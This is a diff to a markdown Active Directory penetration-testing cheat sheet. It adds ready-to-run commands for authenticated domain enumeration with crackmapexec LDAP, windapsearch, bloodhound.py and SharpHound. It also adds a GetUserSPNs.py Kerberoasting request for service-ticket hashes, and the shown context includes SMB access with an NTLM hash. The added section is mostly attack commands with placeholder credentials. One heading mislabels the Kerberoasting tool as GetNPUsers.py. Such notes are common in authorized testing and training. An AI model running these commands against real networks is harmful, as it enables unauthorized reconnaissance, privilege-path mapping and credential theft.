@@ -126,7 +126,41 @@ Use the credentials in you favor to enumerate usefull information or gain access
  ```bash
  crackmapexec smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
  ```
+ 
+  Using ldap
 
+ ```bash
+crackmapexec ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation --password-not-required --admin-count --users --groups
+ ```
+ - [windapsearch](https://github.com/ropnop/windapsearch): Look for users with RDP.
+ 
+ ```bash
+ python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\john -p password123 -U -G --da -m "Remote Desktop Users" -C -r
+ ```
+ - bloodhound: 
+  There are two methods to do bloodhound. 
+ 1 Using bloodhound.py. The python version can be useed remotely from an attacker machine: 
+ 
+  ```bash
+  python3 bloodhound.py -u john -p password123 -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1
+  ```
+ PS: the python version requires GPO information.
+ 
+ 2 Using ShapHound. 
+ Run SharpHound from a PC joined to the domain using your current user and extract all the information you can do:
+
+ ```bash
+ ./SharpHound.exe --CollectionMethod All
+ Invoke-BloodHound -CollectionMethod All #using SharpHound.ps1
+ ```
+ The above commands will give you zipped output which you can use in neo4j database. 
+ 
+ - GetNPUsers.py: 
+ 
+ ```bash
+ python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
+ ```
+ 
 ## SMB SHARES
 
 ```bash
@@ -138,5 +172,3 @@ with ntlm access : smbclient \\\\172.16.1.0\\$share -U user --pw-nt-hash BD1C650
 
 mount smb share : sudo mkdir /tmp/data; sudo mount -t cifs -o 'user=USER,password=PASSWORD' //10.0.2.80/shareapp /tmp/data
 ```
-
-- Find computers you can login to. 
